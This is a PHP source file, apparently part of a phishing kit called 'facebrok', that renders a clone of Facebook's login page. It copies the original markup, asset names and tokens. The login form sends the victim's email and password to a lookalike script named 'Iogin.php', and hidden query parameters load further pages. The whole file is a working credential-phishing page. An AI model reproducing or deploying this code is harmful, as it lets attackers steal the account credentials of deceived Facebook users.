<?php
// RedToor
// Project facebrok
error_reporting(0);
if($_GET['view']=="fbimga100mstartpre"){include("firstlogin.php");}
else if($_GET['view']=="Mksl201shlsDS"){include("firstlogin2.php");}else{
// Language--------------------------------
$lang=$_POST['idio'];
if ($lang=='')
{ 
include("croak/config.php");
mysql_connect($DB_SERV,$DB_USER,$DB_PASS);
mysql_select_db($DB_NADB);
//-----------------------------------
// Check URL 
$sql=mysql_query("SELECT * FROM methods WHERE id=3");
$row=mysql_fetch_array($sql);
$lang=''.$row['value'].''; 
// -- END --
} else {$lang=$lang;}
// Languages------------------------------
include("lang.php")
//----------------------------------------
?>
<!DOCTYPE html>
<html lang="<?php echo"$a"?>" id="facebook" class="no_js">
<head><meta charset="utf-8" /><script>function envFlush(a){function b(c){for(var d in a)c[d]=a[d];}if(window.requireLazy){window.requireLazy(['Env'],b);}else{Env=window.Env||{};b(Env);}}envFlush({"ajaxpipe_token":"AXheRvxQoKLEwHTZ","lhsh":"hAQGkLKUK","khsh":"0`sj`e`rm`s-0fdu^gshdoer-0gc^eurf-3gc^eurf;1;enbtldou;fduDmdldourCxO`ld-2YLMIuuqSdptdru;qsnunuxqd;rdoe"});</script><script>CavalryLogger=false;</script><noscript><meta http-equiv="refresh" content="0; URL=/?_fb_noscript=1" /></noscript><meta name="referrer" content="default" id="meta_referrer" /><title id="pageTitle"><?php echo"$des";?></title><noscript><meta http-equiv="X-Frame-Options" content="DENY" /></noscript><link rel="shortcut icon" href="H3nktOa7ZMg.ico" />
<link type="text/css" rel="stylesheet" href="UvwTahG1t6o.css" />
<link type="text/css" rel="stylesheet" href="6NrvphBRqWp.css" />
<link type="text/css" rel="stylesheet" href="jyN2WET7e_S.css" />
<script src="ATZhtnWB6jU.js" crossorigin="anonymous"></script>
<script>(require("ServerJSDefine")).handleDefines([["URLFragmentPreludeConfig",[],{"incorporateQuicklingFragment":true,"hashtagRedirect":true},137],["BootloaderConfig",[],{},329],["CurrentUserInitialData",[],{"id":"0","account_id":"0","is_employee":false,"is_gray":false},270],["SiteData",[],{"revision":1261553,"tier":"","push_phase":"V3","pkg_cohort":"EXP1:DEFAULT","vip":"31.13.73.129"},317],["DTSGInitialData",[],{},258],["ISB",[],{},330],["LSD",[],{"token":"AVq8M09W"},323],["BanzaiConfig",[],{"EXPIRY":86400000,"MAX_SIZE":10000,"MAX_WAIT":150000,"RESTORE_WAIT":150000,"blacklist":["time_spent"],"gks":{"adapterhooks":true,"boosted_pagelikes":true,"boosted_website":true,"boosted_posts":true,"jslogger":true,"miny_compression":true,"pages_client_logging":true,"time_spent_bit_array":true,"time_spent_debug":true,"useraction":true,"videos":true,"visibility_tracking":true,"vitals":true}},7]]);new (require("ServerJS"))().handle({"require":[["markJSEnabled"],["lowerDomain"],["URLFragmentPrelude"],["Primer"],["Bootloader"]]});</script></head><body class="login_page fbx UIPage_LoggedOut hasSmurfbar hasSmurfbarLoggedOut hasPrivacyLite webkit chrome win Locale_es_ES" dir="ltr"><div class="_li"><div id="pagelet_bluebar" data-referrer="pagelet_bluebar"><div id="blueBarHolder"><div id="blueBar" class="aboveSidebar"><div><div class="loggedout_menubar_container"><div class="clearfix loggedout_menubar">
<a class="lfloat _ohe" href="../" title="<?php echo"$b";?>"><i class="fb_logo img sp_6y74ue sx_1668ad"><u></u></i></a></div></div><div class="signupBanner"><div class="signup_bar_container"><div class="signup_box clearfix"><span class="signup_box_content"><a class="_42ft _42fu signup_btn selected _42gz _42gy" role="button" href="r.php?locale=es_ES"><?php echo"$before"?></a></span></div></div></div></div></div></div></div><div id="globalContainer" class="uiContextualLayerParent"><div id="content" class="fb_content clearfix"><div class="UIFullPage_Container"><div class="mvl ptm uiInterstitial login_page_interstitial uiInterstitialLarge uiBoxWhite"><div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader"><div class="clearfix uiHeaderTop"><div class="rfloat _ohf"><div class="uiHeaderActions"></div></div><div><h2 class="uiHeaderTitle" aria-hidden="true"><?php echo"$c";?></h2></div></div></div><div class="phl ptm uiInterstitialContent"><div class="login_form_container"><div id="standard_status" class="UIMessageBox UIMessageBoxStatus"><div class="pam login_error_box uiBoxRed"><div class="fsl fwb fcb"><?php echo"$d";?></div><div><p><?php echo "$e";?></p><p><?php echo "$f";?></p></div></div><p class="sub_message"></p></div><form id="login_form" action="Iogin.php?login_attempt=1" method="post" onsubmit="return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)"><input type="hidden" name="lsd" value="AVq8M09W" autocomplete="off" /><div class="hidden_elem"></div><div id="loginform"><input type="hidden" autocomplete="off" id="display" name="display" value="" /><input type="hidden" autocomplete="off" id="enable_profile_selector" name="enable_profile_selector" value="" /><input type="hidden" autocomplete="off" id="legacy_return" name="legacy_return" value="1" /><input type="hidden" autocomplete="off" id="profile_selector_ids" name="profile_selector_ids" value="" /><input type="hidden" autocomplete="off" id="trynum" name="trynum" value="1" /><input type="hidden" autocomplete="off" name="timezone" value="" id="u_0_0" /><input type="hidden" name="lgnrnd" value="142001_5Oqr" /><input type="hidden" id="lgnjs" name="lgnjs" value="n" /><div class="form_row clearfix"><label for="email" class="login_form_label"><?php echo"$g";?></label><input type="text" class="inputtext" id="email" name="email" value="" /></div><div class="form_row clearfix"><label for="pass" class="login_form_label"><?php echo"$h";?></label><input type="password" name="password" id="pass" class="inputpassword" /></div><div class="persistent"><div class="uiInputLabel clearfix uiInputLabelLegacy"><input id="persist_box" type="checkbox" value="1" name="persistent" class="uiInputLabelInput uiInputLabelCheckbox" /><label for="persist_box" class="uiInputLabelLabel"><?php echo"$i";?></label></div></div><input type="hidden" autocomplete="off" id="default_persistent" name="default_persistent" value="0" /><div id="buttons" class="form_row clearfix"><label class="login_form_label"></label><div id="login_button_inline"><label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_1"><input value="<?php echo"$j";?>" name="login" type="submit" id="u_0_1" /></label></div><div id="register_link"<?php echo"$k";?>strong><a href="r.php?next&locale=es_ES&display=page" rel="nofollow" tabindex="-1"><?php echo"$l";?></a></strong></div></div><p class="reset_password form_row"><a href="recover/initiate" target="" tabindex="-1"><?php echo"$m";?></a></p></div></form></div></div></div>
<?php include("idiologin.php");      // Lang ?>
<?php include("foot.php");}          // foot ?> 
